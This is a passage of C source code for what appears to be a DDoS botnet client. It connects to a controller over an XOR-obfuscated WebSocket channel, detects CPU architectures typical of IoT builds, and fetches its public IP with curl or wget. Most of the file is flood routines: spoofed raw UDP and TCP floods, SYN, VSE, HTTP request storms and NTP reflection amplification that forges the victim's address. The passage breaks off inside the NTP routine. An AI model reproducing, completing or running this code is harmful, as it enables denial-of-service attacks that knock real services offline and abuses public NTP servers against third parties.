#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <errno.h>
#include <net/if.h>
#include <sys/ioctl.h>
#ifdef USE_SSL
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/rand.h>
#endif

#define SOCKS_ADDRESS "IP"
#define SOCKS_PORT 5512
#define BUFFER_SIZE 65536
#define MAX_PROXIES 10000
#define MAX_PROXY_LINE 256
#define MAX_THREADS_PER_ATTACK 5000
#define XOR_KEY 0x69
#define PHI 0x9e3779b9
#define MAXTTL 255

static uint32_t Q[4096], c_cmwc = 362436;
struct in_addr ourIP;
int gotIP = 0;

void init_rand(uint32_t x) {
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

uint32_t rand_cmwc(void) {
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c_cmwc;
    c_cmwc = (uint32_t)(t >> 32);
    x = t + c_cmwc;
    if (x < c_cmwc) { x++; c_cmwc++; }
    return (Q[i] = r - x);
}

unsigned short csum(unsigned short *buf, int count) {
    register uint64_t sum = 0;
    while (count > 1) { sum += *buf++; count -= 2; }
    if (count > 0) sum += *(unsigned char *)buf;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return (uint16_t)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
    struct tcp_pseudo {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_TCP;
    pseudohead.length = htons(sizeof(struct tcphdr));
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
    unsigned short *tcp = malloc(totaltcp_len);
    memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr));
    unsigned short output = csum(tcp, totaltcp_len);
    free(tcp);
    return output;
}

in_addr_t getRandomIP(in_addr_t netmask) {
    in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
    return tmp ^ (rand_cmwc() & ~netmask);
}

void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + packetSize;
    iph->id = rand_cmwc();
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = protocol;
    iph->check = 0;
    iph->saddr = source;
    iph->daddr = dest;
}

void makeRandomStr(unsigned char *buf, int length) {
    int i;
    for (i = 0; i < length; i++) buf[i] = (rand_cmwc() % (91 - 65)) + 65;
}

void spoofer(char *ip) {
    sprintf(ip, "%d.%d.%d.%d",
        11 + (int)(rand_cmwc() % 186),
        (int)(rand_cmwc() % 256),
        (int)(rand_cmwc() % 256),
        2 + (int)(rand_cmwc() % 253));
}

void getOurIP() {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock == -1) return;
    struct sockaddr_in serv;
    memset(&serv, 0, sizeof(serv));
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = inet_addr("8.8.8.8");
    serv.sin_port = htons(53);
    if (connect(sock, (const struct sockaddr*)&serv, sizeof(serv)) == -1) { close(sock); return; }
    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    if (getsockname(sock, (struct sockaddr*)&name, &namelen) != -1)
        ourIP.s_addr = name.sin_addr.s_addr;
    close(sock);
}

volatile int stop_attacks = 0;
static char proxies[MAX_PROXIES][MAX_PROXY_LINE];
static int proxy_count = 0;

static const char *blocked_domains[] = {
    "a.nel.cloudflare.com",
    "nel.cloudflare.com",
    "pixel.cloudflare.com",
    NULL
};

int is_domain_blocked(const char *host) {
    for (int i = 0; blocked_domains[i]; i++) {
        if (strstr(host, blocked_domains[i])) return 1;
    }
    return 0;
}

struct hostent *safe_gethostbyname(const char *host) {
    if (is_domain_blocked(host)) {

        return NULL;
    }
    return gethostbyname(host);
}

void rand_bytes(unsigned char *buf, size_t len) {
    for (size_t i = 0; i < len; i++)
        buf[i] = (unsigned char)(rand_cmwc() & 0xFF);
}

char* rand_ua(void) {
    static char ua[256];
    int tpl = rand() % 6;
    double r1 = (double)rand() / RAND_MAX + 5.0;
    double r2 = (double)rand() / RAND_MAX;
    double r3 = (double)rand() / RAND_MAX;
    int r4 = 2000 + rand() % 101;
    int r5 = 92215 + rand() % 7785;
    double r6 = (double)rand() / RAND_MAX + (double)(3 + rand() % 7);

    switch (tpl) {
        case 0: snprintf(ua, sizeof(ua), "Mozilla/%.1f (Windows; U; Windows NT %.1f; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f", r1, r1, r2, r3, r4, r5, r6, r1); break;
        case 1: snprintf(ua, sizeof(ua), "Mozilla/%.1f (Windows; U; Windows NT %.1f; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f", r1, r1, r2, r3, r4, r5, r6, r1); break;
        case 2: snprintf(ua, sizeof(ua), "Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f", r1, r2, r3, r4, r5, r6, r1); break;
        case 3: snprintf(ua, sizeof(ua), "Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f", r1, r2, r3, r4, r5, r6, r1); break;
        case 4: snprintf(ua, sizeof(ua), "Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f", r1, r2, r3, r4, r5, r6, r1); break;
        case 5: snprintf(ua, sizeof(ua), "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"); break;
    }
    return ua;
}

void get_arch(char *arch) {
    #if defined(__x86_64__) || defined(_M_X64)
    strcpy(arch, "x86_64");
    #elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)
    strcpy(arch, "x86_32");
    #elif defined(__ARM_ARCH_2__) || defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__) || defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    strcpy(arch, "Arm4");
    #elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
    strcpy(arch, "Arm5");
    #elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__) || defined(__aarch64__)
    strcpy(arch, "Arm6");
    #elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    strcpy(arch, "Arm7");
    #elif defined(mips) || defined(__mips__) || defined(__mips)
    strcpy(arch, "Mips");
    #elif defined(mipsel) || defined(__mipsel__) || defined(__mipsel) || defined(_mipsel)
    strcpy(arch, "Mipsel");
    #elif defined(__sh__)
    strcpy(arch, "Sh4");
    #elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__ppc64__) || defined(__PPC__) || defined(__PPC64__) || defined(_ARCH_PPC) || defined(_ARCH_PPC64)
    strcpy(arch, "Ppc");
    #elif defined(__sparc__) || defined(__sparc)
    strcpy(arch, "spc");
    #elif defined(__m68k__)
    strcpy(arch, "M68k");
    #elif defined(__arc__)
    strcpy(arch, "Arc");
    #else
    strcpy(arch, "unknown");
    #endif
}

static char public_ip_buf[64] = {0};

void get_public_ip(void) {
    FILE *fp = popen("curl -s ipinfo.io/ip 2>/dev/null || wget -q -O - ipinfo.io/ip 2>/dev/null", "r");
    if (!fp) return;
    char buf[64];
    if (fgets(buf, sizeof(buf), fp)) {
        char *nl = strchr(buf, '\n');
        if (nl) *nl = '\0';
        int a, b, c, d;
        if (sscanf(buf, "%d.%d.%d.%d", &a, &b, &c, &d) == 4)
            strncpy(public_ip_buf, buf, sizeof(public_ip_buf) - 1);
    }
    pclose(fp);
}

int ws_connect(const char *host, int port) {

    struct hostent *he = safe_gethostbyname(host);
    if (!he) {

        return -1;
    }

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {

        return -1;
    }

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {

        close(sock);
        return -1;
    }

    char req[1024];
    snprintf(req, sizeof(req),
        "GET / HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        "\r\n", host, port);

    send(sock, req, strlen(req), 0);

    char resp[2048];
    int n = recv(sock, resp, sizeof(resp) - 1, 0);
    if (n <= 0) {

        close(sock);
        return -1;
    }
    resp[n] = '\0';

    if (!strstr(resp, "101")) {

        close(sock);
        return -1;
    }
    return sock;
}

int ws_send_frame(int sock, int opcode, const unsigned char *data, int len) {

    unsigned char frame[6 + len];
    frame[0] = 0x80 | opcode;
    frame[1] = 0x80 | len;
    unsigned char mask[4];
    for (int i = 0; i < 4; i++) mask[i] = rand() & 0xFF;
    memcpy(frame + 2, mask, 4);
    for (int i = 0; i < len; i++)
        frame[6 + i] = data[i] ^ XOR_KEY ^ mask[i % 4];
    int ret = send(sock, frame, 6 + len, 0);
    return ret;
}

int ws_send(int sock, const char *msg) {
    return ws_send_frame(sock, 0x1, (const unsigned char*)msg, strlen(msg));
}

int ws_send_bin(int sock, const unsigned char *data, int len) {
    return ws_send_frame(sock, 0x2, data, len);
}

int ws_read_frame(int sock, unsigned char *opcode, int *masked, unsigned long long *len, unsigned char mask[4]) {
    unsigned char hdr[10];
    int n = recv(sock, hdr, 2, MSG_WAITALL);
    if (n <= 0) return -1;
    *opcode = hdr[0] & 0x0F;
    *masked = (hdr[1] & 0x80) ? 1 : 0;
    *len = hdr[1] & 0x7F;
    if (*len == 126) {
        if (recv(sock, hdr + 2, 2, MSG_WAITALL) <= 0) return -1;
        *len = (hdr[2] << 8) | hdr[3];
    } else if (*len == 127) {
        if (recv(sock, hdr + 2, 8, MSG_WAITALL) <= 0) return -1;
        *len = 0;
        for (int i = 0; i < 8; i++) *len = (*len << 8) | hdr[2 + i];
    }
    if (*masked) {
        if (recv(sock, mask, 4, MSG_WAITALL) <= 0) return -1;
    }
    return 0;
}

int ws_recv(int sock, char *buf, int buf_size) {
    unsigned char opcode;
    int masked, n;
    unsigned long long len;
    unsigned char mask[4];
    while (1) {
        if (ws_read_frame(sock, &opcode, &masked, &len, mask) < 0) return -1;
        if (opcode == 0x9) {
            unsigned long long orig_len = len;
            unsigned char pong_data[125];
            unsigned long long pong_len = orig_len > 125 ? 125 : orig_len;
            unsigned char temp[2048];
            unsigned long long consumed = 0;
            while (len > 0) {
                unsigned long long chunk = len > sizeof(temp) ? sizeof(temp) : len;
                n = recv(sock, temp, chunk, MSG_WAITALL);
                if (n <= 0) return -1;
                if (masked) for (int i = 0; i < n; i++) temp[i] ^= mask[i % 4];
                if (consumed < pong_len) {
                    unsigned long long cpy = n < (pong_len - consumed) ? n : (pong_len - consumed);
                    memcpy(pong_data + consumed, temp, cpy);
                }
                consumed += n;
                len -= n;
            }
            unsigned char pong_frame[6 + 125];
            pong_frame[0] = 0x8A;
            pong_frame[1] = 0x80 | (unsigned char)pong_len;
            unsigned char pmask[4];
            for (int i = 0; i < 4; i++) pmask[i] = rand() & 0xFF;
            memcpy(pong_frame + 2, pmask, 4);
            for (unsigned long long i = 0; i < pong_len; i++)
                pong_frame[6 + i] = pong_data[i] ^ pmask[i % 4];
            send(sock, pong_frame, 6 + pong_len, 0);
            continue;
        }
        if (opcode == 0x8) {
            unsigned char temp[128];
            while (len > 0) {
                unsigned long long chunk = len > sizeof(temp) ? sizeof(temp) : len;
                n = recv(sock, temp, chunk, MSG_WAITALL);
                if (n <= 0) break;
                len -= n;
            }
            unsigned char close_frame[6] = {0x88, 0x80, (unsigned char)(rand() & 0xFF), (unsigned char)(rand() & 0xFF), (unsigned char)(rand() & 0xFF), (unsigned char)(rand() & 0xFF)};
            send(sock, close_frame, 6, 0);
            return -1;
        }
        break;
    }
    if (len >= (unsigned long long)buf_size) len = buf_size - 1;
    n = recv(sock, buf, len, MSG_WAITALL);
    if (n <= 0) return -1;
    if (masked) {
        for (int i = 0; i < n; i++) buf[i] ^= mask[i % 4];
    }
    for (int i = 0; i < n; i++) buf[i] ^= XOR_KEY;
    buf[n] = '\0';
    return n;
}

static const unsigned char ntp_payload[] = "\x17\x00\x03\x2a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

typedef struct {
    char target[256];
    int port;
    double end_time;
    int size;
    int burst_threads;
    int cfbp;
    int spoofit;
    char flags[16];
} attack_args_t;

typedef struct {
    char target[256];
    int port;
    double end_time;
    int threads;
} ntp_args_t;

void parse_url(char *url, char *host, int *port, char *path, int default_port);

void* attack_udp(void *arg) {
    attack_args_t *a = (attack_args_t*)arg;
    int spoofit = a->spoofit > 0 ? a->spoofit : 0;
    int pktsize = a->size > 0 ? a->size : 1024;
    int dport = a->port;
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(a->target);
    memset(dest.sin_zero, 0, sizeof(dest.sin_zero));

    if (spoofit > 0 && spoofit < 32) {
        int raw = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if (raw >= 0) {
            int tmp = 1;
            if (setsockopt(raw, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) { close(raw); goto fallback_udp; }
            in_addr_t netmask = (~((1 << (32 - spoofit)) - 1));
            unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + pktsize];
            struct iphdr *iph = (struct iphdr *)packet;
            struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
            makeIPPacket(iph, dest.sin_addr.s_addr, htonl(getRandomIP(netmask)), IPPROTO_UDP, sizeof(struct udphdr) + pktsize);
            udph->len = htons(sizeof(struct udphdr) + pktsize);
            udph->source = rand_cmwc();
            udph->dest = (dport == 0 ? rand_cmwc() : htons(dport));
            udph->check = 0;
            makeRandomStr((unsigned char*)(udph + 1), pktsize);
            iph->check = csum((unsigned short *)packet, iph->tot_len);
            while (!stop_attacks && time(NULL) < a->end_time) {
                sendto(raw, packet, sizeof(packet), 0, (struct sockaddr *)&dest, sizeof(dest));
                udph->source = rand_cmwc();
                udph->dest = (dport == 0 ? rand_cmwc() : htons(dport));
                iph->id = rand_cmwc();
                iph->saddr = htonl(getRandomIP(netmask));
                iph->check = csum((unsigned short *)packet, iph->tot_len);
            }
            close(raw);
            return NULL;
        }
    }
fallback_udp:
    while (!stop_attacks && time(NULL) < a->end_time) {
        int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock < 0) continue;
        int cdport = dport == 0 ? (int)(rand_cmwc() % 65535 + 1) : dport;
        dest.sin_port = htons(cdport);
        unsigned char *payload = malloc(pktsize);
        rand_bytes(payload, pktsize);
        sendto(sock, payload, pktsize, 0, (struct sockaddr*)&dest, sizeof(dest));
        free(payload);
        close(sock);
    }
    return NULL;
}

void set_tcp_flags(struct tcphdr *tcph, const char *flags) {
    if (!flags || flags[0] == '\0') { tcph->syn = 1; return; }
    if (strcmp(flags, "ALL") == 0) {
        tcph->syn = 1; tcph->rst = 1; tcph->fin = 1; tcph->ack = 1; tcph->psh = 1;
        return;
    }
    char buf[64];
    strncpy(buf, flags, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';
    char *pch = strtok(buf, ",");
    while (pch) {
        if (strcmp(pch, "SYN") == 0) tcph->syn = 1;
        else if (strcmp(pch, "RST") == 0) tcph->rst = 1;
        else if (strcmp(pch, "FIN") == 0) tcph->fin = 1;
        else if (strcmp(pch, "ACK") == 0) tcph->ack = 1;
        else if (strcmp(pch, "PSH") == 0) tcph->psh = 1;
        pch = strtok(NULL, ",");
    }
}

void* attack_tcp(void *arg) {
    attack_args_t *a = (attack_args_t*)arg;
    int spoofit = a->spoofit > 0 ? a->spoofit : 0;
    int pktsize = a->size > 0 ? a->size : 512;
    int dport = a->port;
    const char *flags = a->flags;
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(a->target);
    memset(dest.sin_zero, 0, sizeof(dest.sin_zero));

    if (spoofit > 0 && spoofit < 32) {
        int raw = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if (raw >= 0) {
            int tmp = 1;
            if (setsockopt(raw, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) { close(raw); goto fallback_tcp; }
            in_addr_t netmask;
            if (spoofit == 0) netmask = (~((in_addr_t)-1));
            else netmask = (~((1 << (32 - spoofit)) - 1));
            unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + pktsize];
            struct iphdr *iph = (struct iphdr *)packet;
            struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
            makeIPPacket(iph, dest.sin_addr.s_addr, htonl(getRandomIP(netmask)), IPPROTO_TCP, sizeof(struct tcphdr) + pktsize);
            tcph->source = rand_cmwc();
            tcph->seq = rand_cmwc();
            tcph->ack_seq = 0;
            tcph->doff = 5;
            set_tcp_flags(tcph, flags);
            tcph->window = rand_cmwc();
            tcph->check = 0;
            tcph->urg_ptr = 0;
            tcph->dest = (dport == 0 ? rand_cmwc() : htons(dport));
            tcph->check = tcpcsum(iph, tcph);
            iph->check = csum((unsigned short *)packet, iph->tot_len);
            while (!stop_attacks && time(NULL) < a->end_time) {
                sendto(raw, packet, sizeof(packet), 0, (struct sockaddr *)&dest, sizeof(dest));
                iph->saddr = htonl(getRandomIP(netmask));
                iph->id = rand_cmwc();
                tcph->seq = rand_cmwc();
                tcph->source = rand_cmwc();
                tcph->check = 0;
                tcph->check = tcpcsum(iph, tcph);
                iph->check = csum((unsigned short *)packet, iph->tot_len);
            }
            close(raw);
            return NULL;
        }
    }
fallback_tcp:
    while (!stop_attacks && time(NULL) < a->end_time) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        struct timeval tv = {5, 0};
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        dest.sin_port = htons(dport);
        if (connect(sock, (struct sockaddr*)&dest, sizeof(dest)) == 0) {
            while (!stop_attacks && time(NULL) < a->end_time) {
                unsigned char *payload = malloc(pktsize);
                rand_bytes(payload, pktsize);
                if (send(sock, payload, pktsize, 0) <= 0) { free(payload); break; }
                free(payload);
            }
        }
        close(sock);
    }
    return NULL;
}

void* attack_tup(void *arg) {
    attack_args_t *a = (attack_args_t*)arg;
    int plen = a->size > 0 ? a->size : 1024;
    while (!stop_attacks && time(NULL) < a->end_time) {
        int udp = socket(AF_INET, SOCK_DGRAM, 0);
        int tcp = socket(AF_INET, SOCK_STREAM, 0);
        if (udp < 0 || tcp < 0) { if (udp >= 0) close(udp); if (tcp >= 0) close(tcp); continue; }
        struct timeval tv = {5, 0};
        setsockopt(tcp, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        int dport = a->port == 0 ? (rand() % 65535 + 1) : a->port;
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(a->port);
        addr.sin_addr.s_addr = inet_addr(a->target);
        unsigned char *data = malloc(plen);
        rand_bytes(data, plen);
        if (connect(tcp, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            struct sockaddr_in uaddr;
            uaddr.sin_family = AF_INET;
            uaddr.sin_port = htons(dport);
            uaddr.sin_addr.s_addr = inet_addr(a->target);
            sendto(udp, data, plen, 0, (struct sockaddr*)&uaddr, sizeof(uaddr));
            send(tcp, data, plen, 0);
        }
        free(data);
        close(udp);
        close(tcp);
    }
    return NULL;
}

void* attack_hex(void *arg) {
    attack_args_t *a = (attack_args_t*)arg;
    unsigned char payload[8] = {0x55, 0x55, 0x55, 0x55, 0x00, 0x00, 0x00, 0x01};
    while (!stop_attacks && time(NULL) < a->end_time) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) continue;
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(a->port);
        addr.sin_addr.s_addr = inet_addr(a->target);
        sendto(sock, payload, 8, 0, (struct sockaddr*)&addr, sizeof(addr));
        sendto(sock, payload, 8, 0, (struct sockaddr*)&addr, sizeof(addr));
        sendto(sock, payload, 8, 0, (struct sockaddr*)&addr, sizeof(addr));
        sendto(sock, payload, 8, 0, (struct sockaddr*)&addr, sizeof(addr));
        sendto(sock, payload, 8, 0, (struct sockaddr*)&addr, sizeof(addr));
        sendto(sock, payload, 8, 0, (struct sockaddr*)&addr, sizeof(addr));
        close(sock);
    }
    return NULL;
}

void* attack_roblox(void *arg) {
    attack_args_t *a = (attack_args_t*)arg;
    int plen = a->size > 0 ? a->size : 1024;
    while (!stop_attacks && time(NULL) < a->end_time) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) continue;
        int dport = a->port == 0 ? (rand() % 65535 + 1) : a->port;
        unsigned char *rbytes = malloc(plen);
        rand_bytes(rbytes, plen);
        for (int i = 0; i < 1500 && !stop_attacks; i++) {
            unsigned char hex_bytes[32];
            char hex_str[65];
            for (int j = 0; j < 64; j++) {
                int r = rand() % 16;
                hex_str[j] = r < 10 ? '0' + r : 'a' + r - 10;
            }
            hex_str[64] = '\0';
            for (int j = 0; j < 32; j++)
                sscanf(hex_str + 2 * j, "%2hhx", &hex_bytes[j]);
            unsigned char *total = malloc(32 + plen);
            memcpy(total, hex_bytes, 32);
            memcpy(total + 32, rbytes, plen);
            struct sockaddr_in addr;
            addr.sin_family = AF_INET;
            addr.sin_port = htons(dport);
            addr.sin_addr.s_addr = inet_addr(a->target);
            sendto(sock, total, 32 + plen, 0, (struct sockaddr*)&addr, sizeof(addr));
            free(total);
        }
        free(rbytes);
        close(sock);
    }
    return NULL;
}

void* attack_vse(void *arg) {
    attack_args_t *a = (attack_args_t*)arg;
    unsigned char payload[26] = {
        0xFF, 0xFF, 0xFF, 0xFF, 0x54, 0x53, 0x6F, 0x75, 0x72, 0x63,
        0x65, 0x20, 0x45, 0x6E, 0x67, 0x69, 0x6E, 0x65, 0x20, 0x51,
        0x75, 0x65, 0x72, 0x79, 0x00
    };
    while (!stop_attacks && time(NULL) < a->end_time) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) continue;
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(a->port);
        addr.sin_addr.s_addr = inet_addr(a->target);
        sendto(sock, payload, 26, 0, (struct sockaddr*)&addr, sizeof(addr));
        sendto(sock, payload, 26, 0, (struct sockaddr*)&addr, sizeof(addr));
        close(sock);
    }
    return NULL;
}

void* attack_junk(void *arg) {
    attack_args_t *a = (attack_args_t*)arg;
    unsigned char payload[69];
    memset(payload, 0, 69);
    while (!stop_attacks && time(NULL) < a->end_time) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) continue;
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(a->port);
        addr.sin_addr.s_addr = inet_addr(a->target);
        sendto(sock, payload, 69, 0, (struct sockaddr*)&addr, sizeof(addr));
        sendto(sock, payload, 69, 0, (struct sockaddr*)&addr, sizeof(addr));
        sendto(sock, payload, 69, 0, (struct sockaddr*)&addr, sizeof(addr));
        close(sock);
    }
    return NULL;
}

void* attack_syn(void *arg) {
    attack_args_t *a = (attack_args_t*)arg;
    unsigned char pkt[20];
    unsigned short s1 = 1234, s2 = 5678;
    unsigned int seq = 0, ack = 1234;
    unsigned char flags = 0x40;
    pkt[0] = (s1 >> 8) & 0xFF; pkt[1] = s1 & 0xFF;
    pkt[2] = (s2 >> 8) & 0xFF; pkt[3] = s2 & 0xFF;
    pkt[4] = (seq >> 24) & 0xFF; pkt[5] = (seq >> 16) & 0xFF;
    pkt[6] = (seq >> 8) & 0xFF; pkt[7] = seq & 0xFF;
    pkt[8] = (ack >> 24) & 0xFF; pkt[9] = (ack >> 16) & 0xFF;
    pkt[10] = (ack >> 8) & 0xFF; pkt[11] = ack & 0xFF;
    pkt[12] = flags; pkt[13] = 0;
    pkt[14] = 0; pkt[15] = 0;
    pkt[16] = 0; pkt[17] = 0;
    pkt[18] = 0; pkt[19] = 0;
    while (!stop_attacks && time(NULL) < a->end_time) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        struct timeval tv = {5, 0};
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(a->port);
        addr.sin_addr.s_addr = inet_addr(a->target);
        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            while (!stop_attacks && time(NULL) < a->end_time)
                if (send(sock, pkt, 20, 0) <= 0) break;
        }
        close(sock);
    }
    return NULL;
}

void* attack_storm(void *arg) {
    attack_args_t *a = (attack_args_t*)arg;
    char url_buf[1024];
    strncpy(url_buf, a->target, sizeof(url_buf) - 1);
    url_buf[sizeof(url_buf) - 1] = '\0';
    char host[256], path[1024];
    int port;
    parse_url(url_buf, host, &port, path, 80);
    while (!stop_attacks && time(NULL) < a->end_time) {
        struct hostent *he = safe_gethostbyname(host);
        if (!he) continue;
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        struct timeval tv = {5, 0};
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(a->port);
        memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            char ua[256];
            strcpy(ua, rand_ua());
            char req[2048];
            snprintf(req, sizeof(req),
                "GET / HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Accept: */*\r\n"
                "Connection: keep-alive\r\n\r\n",
                host, ua);
            for (int i = 0; i < 100 && !stop_attacks; i++)
                send(sock, req, strlen(req), 0);
        }
        close(sock);
    }
    return NULL;
}

void* attack_ntp(void *arg) {
    ntp_args_t *a = (ntp_args_t*)arg;
    static char ntp_servers[200][128];
    static int ntp_count = 0;
    if (ntp_count == 0) {
        FILE *f = fopen("ntpServers.txt", "r");
        if (f) {
            char line[256];
            while (fgets(line, sizeof(line), f) && ntp_count < 200) {
                line[strcspn(line, "\r\n")] = 0;
                if (strlen(line) > 0) strcpy(ntp_servers[ntp_count++], line);
            }
            fclose(f);
        }
        if (ntp_count == 0) {
            strcpy(ntp_servers[0], "pool.ntp.org");
            strcpy(ntp_servers[1], "time.nist.gov");
            ntp_count = 2;
        }
    }
    int packets = 10 + rand() % 141;
    while (!stop_attacks && time(NULL) < a->end_time) {
        char *server = ntp_servers[rand() % ntp_count];
        unsigned long s_addr = inet_addr(server);
        int is_ip = (s_addr != INADDR_NONE);
        struct hostent *he = NULL;
        if (!is_ip) {
            he = safe_gethostbyname(server);
            if (!he) continue;
        }
        int raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (raw_sock >= 0) {
            char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + 48];
            struct iphdr *iph = (struct iphdr*)packet;
            struct udphdr *udph = (struct udphdr*)(packet + sizeof(struct iphdr));
            memset(packet, 0, sizeof(packet));
            iph->ihl = 5; iph->version = 4; iph->tos = 0;
            iph->tot_len = htons(sizeof(packet));
            iph->id = htons(rand()); iph->frag_off = 0; iph->ttl = 64;
            iph->protocol = IPPROTO_UDP;
            iph->saddr = inet_addr(a->target);
            if (is_ip) iph->daddr = s_addr;
            else memcpy(&iph->daddr, he->h_addr_list[0], he->h_length);
            iph->check = 0;
            udph->source = htons(rand() % 65535 + 1);
            udph->dest = htons(a->port);
            udph->len = htons(sizeof(packet) - sizeof(struct iphdr));
            udph->check = 0;
            memcpy(packet + sizeof(struct iphdr) + sizeof(struct udphdr), ntp_payload, 48);
            for (int i = 0; i < packets && !stop_attacks; i++)
                send(raw_sock, packet, sizeof(packet), 0);
            close(raw_sock);
        } else {
